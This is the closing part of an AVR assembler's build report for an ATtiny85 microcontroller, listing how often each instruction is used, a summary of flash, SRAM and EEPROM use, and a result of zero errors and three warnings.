pop   :   0 push  :   0 rcall :  36 ret   :   6 reti  :   0 rjmp  :  37 
rol   :   0 ror   :   0 sbc   :   0 sbci  :   3 sbi   :   5 sbic  :   5 
sbis  :   1 sbiw  :   7 sbr   :   0 sbrc  :   0 sbrs  :   0 sec   :   0 
seh   :   0 sei   :   0 sen   :   0 ser   :   0 ses   :   0 set   :   0 
sev   :   0 sez   :   0 sleep :   0 spm   :   0 st    :  14 std   :   4 
sts   :   0 sub   :   0 subi  :   5 swap  :   0 tst   :   0 wdr   :   1 

Instructions used: 35 out of 114 (30.7%)

ATtiny85 memory use summary [bytes]:
Segment   Begin    End      Code   Data   Used    Size   Use%
---------------------------------------------------------------
[.cseg] 0x000000 0x00037a    534    356    890    8192  10.9%
[.dseg] 0x000060 0x000103      0     35     35     512   6.8%
[.eseg] 0x000000 0x000000      0      0      0     512   0.0%

Assembly complete, 0 errors, 3 warnings
